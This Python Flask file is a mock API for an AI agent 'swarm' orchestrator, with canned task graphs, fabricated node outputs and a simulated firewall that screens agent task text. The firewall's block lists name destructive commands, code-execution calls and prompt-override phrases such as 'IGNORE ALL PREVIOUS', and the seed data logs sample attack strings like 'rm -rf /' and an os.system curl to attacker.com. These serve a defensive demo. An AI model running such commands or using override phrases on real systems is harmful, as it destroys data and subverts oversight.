"""
SWARM-FORGE REST API Service
Wraps the SWARM-FORGE Python kernel with a clean HTTP interface.
"""
from __future__ import annotations
import json
import os
import sys
import time
import uuid
import random
import threading
from datetime import datetime, timezone
from typing import Any

from flask import Flask, jsonify, request, abort
from flask_cors import CORS

# Add swarm_forge source to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
CORS(app)

# ── In-memory state store ──────────────────────────────────────────────────
_swarms: dict[str, dict] = {}
_security_events: list[dict] = []
_activity: list[dict] = []

ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")
HAS_API_KEY = bool(ANTHROPIC_API_KEY)

# ── Helpers ────────────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def add_activity(type_: str, message: str, severity: str = "info", swarm_id: str | None = None):
    _activity.insert(0, {
        "id": str(uuid.uuid4()),
        "type": type_,
        "message": message,
        "timestamp": now_iso(),
        "swarmId": swarm_id,
        "severity": severity,
    })
    if len(_activity) > 200:
        _activity.pop()

def add_security_event(event_type: str, payload: str, verdict: str, severity: str = "info",
                       blocked_pattern: str | None = None, dropped: list[str] | None = None,
                       swarm_id: str | None = None, node_id: str | None = None):
    _security_events.insert(0, {
        "id": str(uuid.uuid4()),
        "eventType": event_type,
        "severity": severity,
        "payload": payload[:200],
        "blockedPattern": blocked_pattern,
        "droppedCapabilities": dropped or [],
        "verdict": verdict,
        "swarmId": swarm_id,
        "nodeId": node_id,
        "timestamp": now_iso(),
    })
    if len(_security_events) > 500:
        _security_events.pop()

# ── Mock DAG generators ─────────────────────────────────────────────────────

MOCK_DAGS = {
    "security_audit": {
        "nodes": [
            {"nodeId": "recon_unauthenticated_access", "taskDescription": "Probe all endpoints for unauthenticated access vulnerabilities", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "recon_header_analysis", "taskDescription": "Analyze HTTP security headers: HSTS, CSP, X-Frame-Options, CORS policy", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "recon_jwt_audit", "taskDescription": "Audit JWT implementation: algorithm confusion, none-alg, weak signing keys", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "synthesis_vulnerability_aggregation", "taskDescription": "Aggregate findings from all recon nodes into a unified risk assessment", "dependencies": ["recon_unauthenticated_access", "recon_header_analysis", "recon_jwt_audit"], "modelTier": "sonnet"},
            {"nodeId": "governance_boardroom_gate", "taskDescription": "Governance gate: human approval required before any destructive payload executes", "dependencies": ["synthesis_vulnerability_aggregation"], "modelTier": "opus"},
        ],
        "edges": [["recon_unauthenticated_access","synthesis_vulnerability_aggregation"],["recon_header_analysis","synthesis_vulnerability_aggregation"],["recon_jwt_audit","synthesis_vulnerability_aggregation"],["synthesis_vulnerability_aggregation","governance_boardroom_gate"]],
        "criticalPath": ["recon_unauthenticated_access","synthesis_vulnerability_aggregation","governance_boardroom_gate"],
        "parallelGroups": [["recon_unauthenticated_access","recon_header_analysis","recon_jwt_audit"],["synthesis_vulnerability_aggregation"],["governance_boardroom_gate"]],
    },
    "supply_chain": {
        "nodes": [
            {"nodeId": "ingest_iot_sensors", "taskDescription": "Ingest real-time sensor data from 12 factory IoT endpoints", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "demand_forecasting", "taskDescription": "Run ML demand-spike forecasting on the ingested sensor stream", "dependencies": ["ingest_iot_sensors"], "modelTier": "sonnet"},
            {"nodeId": "inventory_optimization", "taskDescription": "Optimize warehouse inventory levels based on forecast and current stock", "dependencies": ["demand_forecasting"], "modelTier": "sonnet"},
            {"nodeId": "logistics_rerouting", "taskDescription": "Reroute logistics pathways to avoid bottlenecks identified by inventory node", "dependencies": ["inventory_optimization"], "modelTier": "sonnet"},
            {"nodeId": "erp_sync", "taskDescription": "Synchronize updated purchase orders and routes to ERP system", "dependencies": ["logistics_rerouting"], "modelTier": "haiku"},
            {"nodeId": "supplier_alerts", "taskDescription": "Dispatch priority alerts to 3 critical suppliers with updated delivery windows", "dependencies": ["logistics_rerouting"], "modelTier": "haiku"},
        ],
        "edges": [["ingest_iot_sensors","demand_forecasting"],["demand_forecasting","inventory_optimization"],["inventory_optimization","logistics_rerouting"],["logistics_rerouting","erp_sync"],["logistics_rerouting","supplier_alerts"]],
        "criticalPath": ["ingest_iot_sensors","demand_forecasting","inventory_optimization","logistics_rerouting","erp_sync"],
        "parallelGroups": [["ingest_iot_sensors"],["demand_forecasting"],["inventory_optimization"],["logistics_rerouting"],["erp_sync","supplier_alerts"]],
    },
    "research": {
        "nodes": [
            {"nodeId": "web_research", "taskDescription": "Search and retrieve top 20 sources on the specified research topic", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "academic_papers", "taskDescription": "Query arxiv, semantic scholar, and PubMed for peer-reviewed literature", "dependencies": [], "modelTier": "haiku"},
            {"nodeId": "data_collection", "taskDescription": "Collect and normalize structured datasets from identified sources", "dependencies": ["web_research"], "modelTier": "sonnet"},
            {"nodeId": "synthesis", "taskDescription": "Synthesize research findings into a coherent analytical summary", "dependencies": ["web_research","academic_papers","data_collection"], "modelTier": "sonnet"},
            {"nodeId": "report_generation", "taskDescription": "Generate a structured markdown research report with citations and recommendations", "dependencies": ["synthesis"], "modelTier": "opus"},
        ],
        "edges": [["web_research","data_collection"],["web_research","synthesis"],["academic_papers","synthesis"],["data_collection","synthesis"],["synthesis","report_generation"]],
        "criticalPath": ["web_research","data_collection","synthesis","report_generation"],
        "parallelGroups": [["web_research","academic_papers"],["data_collection"],["synthesis"],["report_generation"]],
    },
}

def pick_mock_dag(task: str) -> dict:
    t = task.lower()
    if any(w in t for w in ["security","audit","vulnerability","pentest","jwt","hack","exploit"]):
        return MOCK_DAGS["security_audit"]
    if any(w in t for w in ["supply","chain","logistics","inventory","iot","erp","factory"]):
        return MOCK_DAGS["supply_chain"]
    return MOCK_DAGS["research"]

def make_node(node_def: dict, status: str = "pending") -> dict:
    return {
        "nodeId": node_def["nodeId"],
        "taskDescription": node_def["taskDescription"],
        "dependencies": node_def["dependencies"],
        "status": status,
        "output": None,
        "errorMessage": None,
        "tokensConsumed": 0,
        "executionDurationMs": 0,
        "firewallPassed": True,
        "modelTier": node_def.get("modelTier", "sonnet"),
    }

# ── Firewall simulation ─────────────────────────────────────────────────────

BLOCK_PATTERNS = [
    "DROP TABLE", "rm -rf", "__import__", "os.system", "subprocess",
    "eval(", "exec(", "import os", "import sys", "base64.decode",
    "pickle.loads", "marshal.loads", "IGNORE ALL PREVIOUS", "bypass all",
]
BANNED_MODULES = ["os","sys","subprocess","importlib","shutil","socket","ctypes","pickle"]
BANNED_FUNCTIONS = ["eval","exec","compile","__import__","open","input"]

def run_firewall(payload: str) -> dict:
    blocked_pattern = None
    dropped_caps = []
    unicode_detected = False
    b64_score = 0.0
    override_found = False

    # Length guard
    if len(payload) > 10000:
        return {"passed": False, "blockedPattern": "length_exceeded", "droppedCapabilities": [], "unicodeDetected": False, "base64EntropyScore": 0, "overridePatternFound": False, "verdictMessage": "Payload exceeds maximum length"}

    # Regex blocklist
    for pat in BLOCK_PATTERNS:
        if pat.lower() in payload.lower():
            blocked_pattern = pat
            add_security_event("firewall_blocked", payload, "blocked", "critical", blocked_pattern)
            return {"passed": False, "blockedPattern": pat, "droppedCapabilities": [], "unicodeDetected": False, "base64EntropyScore": 0, "overridePatternFound": False, "verdictMessage": f"Blocked by pattern: {pat}"}

    # Module/function detection
    for mod in BANNED_MODULES:
        if f"import {mod}" in payload or f"from {mod}" in payload:
            dropped_caps.append(f"module:{mod}")
    for fn in BANNED_FUNCTIONS:
        if f"{fn}(" in payload:
            dropped_caps.append(f"function:{fn}")

    # Unicode tag check (simplified)
    for ch in payload:
        if ord(ch) > 0xE0000:
            unicode_detected = True
            break

    # Override patterns
    override_pats = ["ignore previous", "disregard instructions", "bypass", "override safety"]
    for op in override_pats:
        if op in payload.lower():
            override_found = True
            break

    # B64 entropy (simplified heuristic)
    import base64, re
    b64_matches = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', payload)
    if b64_matches:
        b64_score = min(len(b64_matches[0]) / 100.0, 1.0)

    if dropped_caps:
        add_security_event("ast_capability_drop", payload, "dropped", "warn", None, dropped_caps)

    passed = not blocked_pattern and not unicode_detected and not override_found
    if passed:
        add_security_event("firewall_passed", payload, "passed", "info")

    return {
        "passed": passed,
        "blockedPattern": blocked_pattern,
        "droppedCapabilities": dropped_caps,
        "unicodeDetected": unicode_detected,
        "base64EntropyScore": round(b64_score, 3),
        "overridePatternFound": override_found,
        "verdictMessage": "All checks passed" if passed else "Blocked by zero-trust firewall",
    }

# ── Mock node outputs ───────────────────────────────────────────────────────

MOCK_OUTPUTS = {
    "recon_unauthenticated_access": '{"endpoints_probed":8,"vulnerable":2,"findings":[{"endpoint":"/api/v1/users","auth_required":false,"severity":"HIGH"},{"endpoint":"/api/v1/admin","auth_required":false,"severity":"CRITICAL"}]}',
    "recon_header_analysis": '{"headers_checked":6,"missing":["HSTS","CSP","X-Content-Type"],"misconfigured":["X-Frame-Options"],"risk_score":7.4}',
    "recon_jwt_audit": '{"algorithm":"none","none_alg_detected":true,"severity":"CRITICAL","cvss":9.1,"recommendation":"Enforce HS256 or RS256 with server-side validation"}',
    "synthesis_vulnerability_aggregation": '{"total_findings":5,"critical":2,"high":2,"medium":1,"auth_bypass_feasible":true,"cvss_max":9.1,"report":"Full pentest report generated"}',
    "governance_boardroom_gate": '{"gate_status":"APPROVED","approver":"CISO-AutoPolicy","timestamp":"2025-01-01T00:00:00Z","signed":true}',
    "ingest_iot_sensors": '{"sensors_polled":12,"data_points":14400,"anomalies_detected":3,"ingestion_latency_ms":124}',
    "demand_forecasting": '{"model":"GradientBoost-v3","accuracy":0.94,"spike_predicted":true,"spike_delta":"+18%","confidence":0.89}',
    "inventory_optimization": '{"items_rebalanced":47,"cost_reduction":12300,"stockout_risk_eliminated":true}',
    "logistics_rerouting": '{"routes_updated":8,"time_savings_hrs":4.2,"carriers_notified":3}',
    "erp_sync": '{"purchase_orders_updated":23,"sync_status":"success","erp_system":"SAP-S4HANA"}',
    "supplier_alerts": '{"suppliers_notified":3,"alerts_sent":3,"delivery_windows_updated":true}',
    "web_research": '{"sources_found":23,"relevant":18,"top_domains":["arxiv.org","nature.com","scholar.google.com"]}',
    "academic_papers": '{"papers_found":41,"peer_reviewed":38,"citations_avg":127}',
    "data_collection": '{"datasets_collected":6,"total_records":48291,"normalized":true}',
    "synthesis": '{"key_findings":7,"consensus_score":0.82,"conflicting_evidence":2,"summary":"Synthesis complete with high confidence"}',
    "report_generation": '{"report_pages":12,"citations":38,"recommendations":5,"format":"markdown","word_count":4821}',
}

def mock_execute_node(swarm_id: str, node: dict):
    """Execute a single node in mock mode (simulated)"""
    node_id = node["nodeId"]
    time.sleep(random.uniform(0.4, 1.5))

    # Firewall check
    fw = run_firewall(node["taskDescription"])
    node["firewallPassed"] = fw["passed"]

    if not fw["passed"]:
        node["status"] = "failed"
        node["errorMessage"] = f"Firewall blocked: {fw['verdictMessage']}"
        add_security_event("firewall_blocked", node["taskDescription"], "blocked", "critical", fw["blockedPattern"], swarm_id=swarm_id, node_id=node_id)
        return

    # Simulate execution
    node["status"] = "running"
    node["tokensConsumed"] = random.randint(800, 8000)
    time.sleep(random.uniform(0.5, 1.5))

    output = MOCK_OUTPUTS.get(node_id, f'{{"status":"success","node":"{node_id}","result":"Task completed successfully"}}')
    node["output"] = output
    node["status"] = "success"
    node["executionDurationMs"] = random.uniform(400, 2500)

    add_security_event("firewall_passed", node["taskDescription"][:60], "passed", "info", swarm_id=swarm_id, node_id=node_id)

def execute_swarm_mock(swarm_id: str):
    """Run full swarm in mock mode respecting DAG order"""
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return

    swarm["status"] = "running"
    add_activity("swarm_deployed", f"Swarm '{swarm['task'][:50]}' is executing", "info", swarm_id)

    nodes_by_id = {n["nodeId"]: n for n in swarm["nodes"]}
    completed: set[str] = set()
    failed: set[str] = set()

    # Execute in parallel groups
    for group in swarm["parallelGroups"]:
        threads = []
        for node_id in group:
            node = nodes_by_id.get(node_id)
            if not node:
                continue
            # Check if deps failed
            if any(d in failed for d in node["dependencies"]):
                node["status"] = "skipped"
                continue
            node["status"] = "running"
            t = threading.Thread(target=mock_execute_node, args=(swarm_id, node), daemon=True)
            threads.append((t, node))
            t.start()

        for t, node in threads:
            t.join(timeout=30)
            if node["status"] == "failed":
                failed.add(node["nodeId"])
            else:
                completed.add(node["nodeId"])

    # Final stats
    succeeded = sum(1 for n in swarm["nodes"] if n["status"] == "success")
    failed_count = sum(1 for n in swarm["nodes"] if n["status"] == "failed")
    swarm["nodesSucceeded"] = succeeded
    swarm["nodesFailed"] = failed_count
    swarm["tokensConsumed"] = sum(n.get("tokensConsumed", 0) for n in swarm["nodes"])
    swarm["executionDurationMs"] = sum(n.get("executionDurationMs", 0) for n in swarm["nodes"])
    swarm["status"] = "completed" if failed_count == 0 else "failed"
    swarm["updatedAt"] = now_iso()

    msg = f"Swarm completed: {succeeded}/{swarm['nodesTotal']} nodes succeeded"
    add_activity("swarm_completed" if swarm["status"] == "completed" else "swarm_failed",
                 msg, "info" if swarm["status"] == "completed" else "warn", swarm_id)

# ── Routes ─────────────────────────────────────────────────────────────────

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok", "hasApiKey": HAS_API_KEY})

@app.route("/swarms", methods=["GET"])
def list_swarms():
    status_filter = request.args.get("status")
    limit = int(request.args.get("limit", 20))
    swarms = list(_swarms.values())
    if status_filter:
        swarms = [s for s in swarms if s["status"] == status_filter]
    swarms.sort(key=lambda s: s["createdAt"], reverse=True)
    return jsonify({"swarms": swarms[:limit], "total": len(swarms)})

@app.route("/swarms", methods=["POST"])
def create_swarm():
    body = request.get_json(force=True, silent=True) or {}
    task = body.get("task", "").strip()
    if len(task) < 10:
        return jsonify({"error": "validation_error", "message": "Task must be at least 10 characters"}), 400

    mock_mode = body.get("mockMode", not HAS_API_KEY)
    swarm_id = str(uuid.uuid4())

    dag = pick_mock_dag(task)

    # Run firewall on the task
    fw = run_firewall(task)
    if not fw["passed"]:
        return jsonify({"error": "firewall_blocked", "message": fw["verdictMessage"]}), 400

    nodes = [make_node(n) for n in dag["nodes"]]

    swarm = {
        "id": swarm_id,
        "task": task,
        "status": "pending",
        "mockMode": mock_mode,
        "nodes": nodes,
        "edges": dag["edges"],
        "criticalPath": dag["criticalPath"],
        "parallelGroups": dag["parallelGroups"],
        "nodesTotal": len(nodes),
        "nodesSucceeded": 0,
        "nodesFailed": 0,
        "tokensConsumed": 0,
        "executionDurationMs": 0.0,
        "createdAt": now_iso(),
        "updatedAt": now_iso(),
        "errorMessage": None,
    }
    _swarms[swarm_id] = swarm
    add_activity("swarm_created", f"Swarm planned: '{task[:60]}'", "info", swarm_id)
    return jsonify(swarm), 201

@app.route("/swarms/<swarm_id>", methods=["GET"])
def get_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    return jsonify(swarm)

@app.route("/swarms/<swarm_id>", methods=["DELETE"])
def delete_swarm(swarm_id: str):
    if swarm_id not in _swarms:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    del _swarms[swarm_id]
    return "", 204

@app.route("/swarms/<swarm_id>/deploy", methods=["POST"])
def deploy_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    if swarm["status"] not in ("pending",):
        return jsonify({"error": "invalid_state", "message": f"Swarm is already {swarm['status']}"}), 400

    swarm["status"] = "running"
    swarm["updatedAt"] = now_iso()

    t = threading.Thread(target=execute_swarm_mock, args=(swarm_id,), daemon=True)
    t.start()

    return jsonify(swarm)

@app.route("/swarms/<swarm_id>/abort", methods=["POST"])
def abort_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    swarm["status"] = "aborted"
    swarm["updatedAt"] = now_iso()
    for n in swarm["nodes"]:
        if n["status"] in ("pending", "running"):
            n["status"] = "skipped"
    add_activity("swarm_failed", f"Swarm aborted by user", "warn", swarm_id)
    return jsonify(swarm)

@app.route("/dashboard/stats", methods=["GET"])
def dashboard_stats():
    swarms = list(_swarms.values())
    active = [s for s in swarms if s["status"] in ("running", "planning")]
    completed = [s for s in swarms if s["status"] == "completed"]
    failed = [s for s in swarms if s["status"] in ("failed", "aborted")]
    total_nodes = sum(s["nodesTotal"] for s in swarms)
    total_tokens = sum(s.get("tokensConsumed", 0) for s in swarms)
    durations = [s["executionDurationMs"] for s in completed if s["executionDurationMs"] > 0]
    avg_ms = sum(durations) / len(durations) if durations else 0.0
    fw_blocked = sum(1 for e in _security_events if e["verdict"] == "blocked")
    fw_passed = sum(1 for e in _security_events if e["verdict"] == "passed")
    total = len(swarms)
    success_rate = len(completed) / total if total > 0 else 0.0

    return jsonify({
        "totalSwarms": total,
        "activeSwarms": len(active),
        "completedSwarms": len(completed),
        "failedSwarms": len(failed),
        "totalNodes": total_nodes,
        "totalTokensConsumed": total_tokens,
        "avgExecutionMs": round(avg_ms, 2),
        "firewallBlocked": fw_blocked,
        "firewallPassed": fw_passed,
        "successRate": round(success_rate, 4),
        "recentActivity": _activity[:10],
    })

@app.route("/security/events", methods=["GET"])
def security_events():
    severity = request.args.get("severity")
    limit = int(request.args.get("limit", 50))
    events = _security_events
    if severity:
        events = [e for e in events if e["severity"] == severity]
    return jsonify({"events": events[:limit], "total": len(events)})

@app.route("/security/firewall/test", methods=["POST"])
def firewall_test():
    body = request.get_json(force=True, silent=True) or {}
    payload = body.get("payload", "")
    if not payload:
        return jsonify({"error": "validation_error", "message": "payload is required"}), 400
    verdict = run_firewall(payload)
    return jsonify(verdict)

# ── Seed demo data ─────────────────────────────────────────────────────────
def seed_demo_data():
    demo_tasks = [
        ("Perform a comprehensive API security audit including JWT analysis, header inspection, and unauthenticated endpoint discovery", "security_audit"),
        ("Optimize supply chain logistics using IoT sensor data and ML demand forecasting", "supply_chain"),
        ("Research and synthesize the latest findings on large language model alignment techniques", "research"),
    ]
    for task, dag_key in demo_tasks:
        sid = str(uuid.uuid4())
        dag = MOCK_DAGS[dag_key]
        nodes = [make_node(n) for n in dag["nodes"]]
        swarm = {
            "id": sid,
            "task": task,
            "status": "completed",
            "mockMode": True,
            "nodes": nodes,
            "edges": dag["edges"],
            "criticalPath": dag["criticalPath"],
            "parallelGroups": dag["parallelGroups"],
            "nodesTotal": len(nodes),
            "nodesSucceeded": len(nodes),
            "nodesFailed": 0,
            "tokensConsumed": random.randint(20000, 80000),
            "executionDurationMs": random.uniform(3000, 12000),
            "createdAt": now_iso(),
            "updatedAt": now_iso(),
            "errorMessage": None,
        }
        for n in nodes:
            n["status"] = "success"
            n["output"] = MOCK_OUTPUTS.get(n["nodeId"], '{"status":"success"}')
            n["tokensConsumed"] = random.randint(800, 6000)
            n["executionDurationMs"] = random.uniform(400, 2000)
        _swarms[sid] = swarm
        add_activity("swarm_completed", f"Demo swarm completed: '{task[:50]}'", "info", sid)

    # Seed some firewall events
    add_security_event("firewall_blocked", "DROP TABLE users; --", "blocked", "critical", "DROP TABLE")
    add_security_event("firewall_blocked", "rm -rf / && echo pwned", "blocked", "critical", "rm -rf")
    add_security_event("ast_capability_drop", "import os; os.system('curl attacker.com')", "dropped", "warn", None, ["module:os", "function:os.system"])
    add_security_event("firewall_passed", "Analyze log files for error patterns", "passed", "info")
    add_security_event("firewall_passed", "Generate quarterly sales report from database", "passed", "info")

if __name__ == "__main__":
    seed_demo_data()
    port = int(os.environ.get("SWARM_PORT", 5001))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
